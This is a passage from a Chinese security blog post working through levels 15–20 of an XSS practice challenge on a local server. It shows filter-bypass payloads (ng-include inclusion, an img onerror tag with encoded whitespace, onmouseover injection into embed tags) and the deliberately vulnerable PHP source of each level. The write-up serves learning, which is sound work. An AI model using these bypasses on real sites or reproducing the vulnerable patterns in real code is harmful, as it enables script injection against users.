<p>相关参数说明：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-2066071becfc08b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>3.现在，我就可以尝试让其包含某个可以执行xss漏洞的文件，然后让包含的文件调用alert方法就可以了。使用<code>level1.php</code>试试，构造：<code>?src=&#39;level1.php?keyword=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code> 发现 <code>&lt;</code>和<code>&gt;</code>被过滤了。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-579a2fb35d70da91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>4.那使用onclick试试，选择<code>level2.php</code> 构造<code>?src=&#39;level2.php?keyword=&quot;onclick=&quot;alert(123)&#39;</code> 双引号也是被解析的，但是成功了。解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-9566166e0fb23935.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>5.有点迷，看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level16.php?keyword=test"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现使用了<code>htmlspecialchars($str)</code> 按理应该不会通过，可是过了，是否说明通过ng-include包含进来的文件会自动识别html实体，然后执行。那第一个又不行，查了好久，也不知道怎么回事，先放着。</p>
<hr>
<h4 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h4><p>1.提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 发现将<code>script</code>和<code>/</code> 都转为空格了。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-ba31244ee3104344.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.但是<code>&lt;</code>和<code>&gt;</code>没有过滤，后还发现空格也会转义，这里用<code>Blanks=(&#39;%09&#39;, &#39;%0A&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0a&#39;)</code>代替 。而且，这里使用一种新的事件。<br><code>onerror 事件</code>： 会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。</p>
<p>语法：<code>onerror=&quot;SomeJavaScriptCode&quot;</code> 后面的 <code>SomeJavaScriptCode</code>必需。规定该事件发生时执行的 JavaScript。</p>
<p>支持该事件的 HTML 标签：<code>&lt;img&gt;, &lt;object&gt;, &lt;style&gt;</code><br>支持该事件的 JavaScript 对象：<code>window, image</code></p>
<p>3.这里我们用<code>&lt;img&gt;</code>，构造：<code>&lt;img%0asrc=1%0aonerror=&quot;alert(1)&quot;&gt;</code> 成功，查看解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-ef95b0c6e36ee452.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>4.查看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"	"</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现有两个空格？其实不是，在Python中看看是什么<br><img src="https://upload-images.jianshu.io/upload_images/9216631-c05a640ade3c64dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9216631-01a21d39529a3853.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9216631-004a201a9aef4f5c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>5.因此,实际是过滤了script，空格，/，横向制表这四个字符（这个和做题没有关系，看到了就顺便了解一下而已）</p>
<hr>
<h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>1.进入，发现<code>http://localhost/xss/level17.php?arg01=a&amp;arg02=b</code>两个参数分别为a,b,再看看响应：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-85d3110e122be577.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>发现a和b都显示了，可以考虑在a,b处构造，而且不用考虑引号闭合问题（用空格隔开就好）。</p>
<p>2.<embed> 标签是定义嵌入的内容，比如插件。这里插件就是<code>xsf01.swf</code> </p>
<p>3.构造：<code>arg01=a&amp;arg02=1%20onmouseover=alert(1)</code> （这里直接把空格替代了，后来测试发现不替代也行）当鼠标移动到插件上时，成功，查看解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-c8f12972b79d831c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>4.产看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>两个参数都进行了HTML实体转化。</p>
<hr>
<h4 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h4><p>1.发现和level17差不多啊，直接提交上题的payload，即<code>rg01=a&amp;arg02=1 onmouseover=alert(1)</code>成功，解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-96c7b6a717e30caa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.看看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>和上题就只有插件不同。</p>
<hr>
<h4 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h4><p>1.这题和下题相似，都是比上面两个题多了双引号闭合。这个也是上面一直没有解决的问题。后来才发现原来这几题考的的关于flash xss的，这个方面就先不看了，直接看看源码吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h4><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level20&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>原本不打算写这篇文章的，因为太菜，怕写得不好。后来想了想，还是记录一下吧，不然忘得太快，到时候想复习看一下都找不到，所以还是写了。当然，也希望能帮到有需要的朋友。此外，文章的内容可能有错或者做法比较愚蠢的，还望这位不吝赐教，多谢。</p>
<hr>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    lei
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://clwsec.top/2019/03/30/XSS学习之xss20/" title="XSS学习之xss20">https://clwsec.top/2019/03/30/XSS学习之xss20/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/XSS20/" rel="tag"> <i class="fa fa-tag"></i> XSS20</a>
          
            <a href="/tags/xss/" rel="tag"> <i class="fa fa-tag"></i> xss</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/03/27/南邮CTF记录/" rel="next" title="南邮CTF记录">
                <i class="fa fa-chevron-left"></i> 南邮CTF记录
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/01/实验吧web记录/" rel="prev" title="实验吧Web记录">
                实验吧Web记录 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="lei">
            
              <p class="site-author-name" itemprop="name">lei</p>
              <p class="site-description motion-element" itemprop="description">业精于勤 荒于嬉 行成于思 毁于随</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">28</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/clwsec" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="email:clwsec@163.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.jianshu.com/u/7e18a3f52ba3" target="_blank" title="简书">
                      
                        <i class="fa fa-fw fa-heartbeat"></i>简书</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="qq:740455490" target="_blank" title="QQ">
                      
                        <i class="fa fa-fw fa-qq"></i>QQ</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.baidu.com/" title="百度" target="_blank">百度</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.zhihu.com/" title="知乎" target="_blank">知乎</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.w3school.com.cn/" title="W3school" target="_blank">W3school</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.runoob.com/" title="菜鸟" target="_blank">菜鸟</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于xss"><span class="nav-number">2.</span> <span class="nav-text">关于xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开始实践"><span class="nav-number">3.</span> <span class="nav-text">开始实践</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level1"><span class="nav-number">3.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level2"><span class="nav-number">3.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level3"><span class="nav-number">3.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level4"><span class="nav-number">3.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level5"><span class="nav-number">3.5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level6"><span class="nav-number">3.6.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level7"><span class="nav-number">3.7.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level8"><span class="nav-number">3.8.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level9"><span class="nav-number">3.9.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level10"><span class="nav-number">3.10.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level11"><span class="nav-number">3.11.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level12"><span class="nav-number">3.12.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level13"><span class="nav-number">3.13.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level14"><span class="nav-number">3.14.</span> <span class="nav-text">level14</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level15"><span class="nav-number">3.15.</span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level16"><span class="nav-number">3.16.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level17"><span class="nav-number">3.17.</span> <span class="nav-text">level17</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level18"><span class="nav-number">3.18.</span> <span class="nav-text">level18</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level19"><span class="nav-number">3.19.</span> <span class="nav-text">level19</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level20"><span class="nav-number">3.20.</span> <span class="nav-text">level20</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-snowflake-o"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lei</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">67k</span>
  
</div>







        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 访问总量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  


  

  

</body>
</html>
